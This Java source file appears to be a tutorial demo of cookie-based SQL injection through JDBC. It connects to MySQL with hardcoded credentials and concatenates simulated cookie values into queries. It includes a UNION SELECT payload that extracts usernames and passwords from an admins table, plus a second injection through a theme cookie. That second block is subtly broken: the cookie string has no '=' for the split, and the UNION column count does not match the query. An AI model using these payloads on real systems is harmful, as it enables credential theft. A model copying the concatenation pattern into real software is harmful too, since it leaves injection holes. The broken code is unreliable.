// Cookie-Based SQL Injection via JDBC
// Attacker injects SQL through a cookie value that the app trusts and concatenates.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class cookie_based_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE: cookie value taken on faith and concatenated into SQL
        String cookie = "session=1 UNION SELECT username, password, NULL FROM admins";
        String sessionId = cookie.substring(cookie.indexOf('=') + 1);

        String query = "SELECT id, name, email FROM users WHERE id = " + sessionId;
        ResultSet rs = st.executeQuery(query);
        while (rs.next()) {
            System.out.println("Cookie attack result: " + rs.getString(2));
        }

        // Theme cookie injection
        String themeCookie = "dark' UNION SELECT banner, NULL FROM notifications -- ";
        String theme = themeCookie.split("=")[1];
        String themeQuery = "SELECT banner FROM settings WHERE theme = '" + theme + "'";
        ResultSet trs = st.executeQuery(themeQuery);
        while (trs.next()) {
            System.out.println("Theme leak: " + trs.getString(1));
        }

        rs.close();
        trs.close();
        st.close();
        con.close();
    }
}
